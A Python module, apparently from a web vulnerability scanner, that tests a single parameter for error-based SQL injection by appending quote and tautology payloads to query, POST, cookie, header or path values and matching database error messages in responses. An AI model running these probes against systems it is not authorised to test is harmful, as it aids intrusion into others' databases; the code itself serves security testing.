import re
import urllib.parse
from ..utils import send_request

ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
]


PAYLOADS = ["'", '"', "'--", '"--', "' or '1'='1", '" or "1"="1']


def test_parameter(
    url,
    param,
    value,
    method="get",
    data=None,
    cookies=None,
    headers=None,
    location="query",
    path_index=None,
):
    """Attempt error-based SQL injection on a parameter."""
    data = data or {}
    cookies = cookies or {}
    headers = headers or {}
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)
    if location == "cookie":
        original = cookies.get(param, "")
    elif location == "header":
        original = headers.get(param, "")
    elif location == "path" and path_index is not None:
        segments = parsed.path.split("/")
        original = segments[path_index]
    elif method.lower() == "get":
        original = query.get(param, [""])[0]
    else:
        original = data.get(param, "")

    results = []
    for payload in PAYLOADS:
        if location == "cookie":
            new_cookies = cookies.copy()
            new_cookies[param] = original + payload
            new_url = url
            try:
                body = send_request(new_url, method=method, data=data if method.lower() == "post" else None, cookies=new_cookies)
            except Exception as e:
                body = str(e)
        elif location == "header":
            new_headers = headers.copy()
            new_headers[param] = original + payload
            new_url = url
            try:
                body = send_request(
                    new_url,
                    method=method,
                    data=data if method.lower() == "post" else None,
                    cookies=cookies,
                    headers=new_headers,
                )
            except Exception as e:
                body = str(e)
        elif location == "path" and path_index is not None:
            segments = parsed.path.split("/")
            segments[path_index] = original + payload
            new_path = "/".join(segments)
            new_url = urllib.parse.urlunparse(parsed._replace(path=new_path))
            try:
                body = send_request(
                    new_url,
                    method=method,
                    data=data if method.lower() == "post" else None,
                    cookies=cookies,
                    headers=headers,
                )
            except Exception as e:
                body = str(e)
        elif method.lower() == "get":
            query[param] = original + payload
            new_query = urllib.parse.urlencode(query, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            try:
                body = send_request(new_url, cookies=cookies, headers=headers)
            except Exception as e:
                body = str(e)
        else:
            post_data = data.copy()
            post_data[param] = original + payload
            new_url = url
            try:
                body = send_request(new_url, method="post", data=post_data, cookies=cookies, headers=headers)
            except Exception as e:
                body = str(e)

        vulnerable = any(p.search(body) for p in ERROR_PATTERNS)
        results.append({
            "url": new_url,
            "param": param,
            "payload": payload,
            "vulnerable": vulnerable,
        })
    return results
